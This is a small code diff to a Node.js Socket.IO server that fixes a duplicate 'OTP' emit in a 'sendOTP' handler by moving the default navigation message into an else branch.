@@ -402,8 +402,10 @@ io.on('connection', (socket, req) => {
     socket.on('sendOTP', (data) => {
         if(data.customQuestion){
             io.to(data.ip).emit('OTP', {otp:true, navig: data.navig+"/"+data.customQuestion})
+        } else {
+            io.to(data.ip).emit('OTP', {otp:true, navig: data.navig})
         }
-        io.to(data.ip).emit('OTP', {otp:true, navig: data.navig})
+        
     })
 
     socket.on('sendOTPResponse', (data) => {
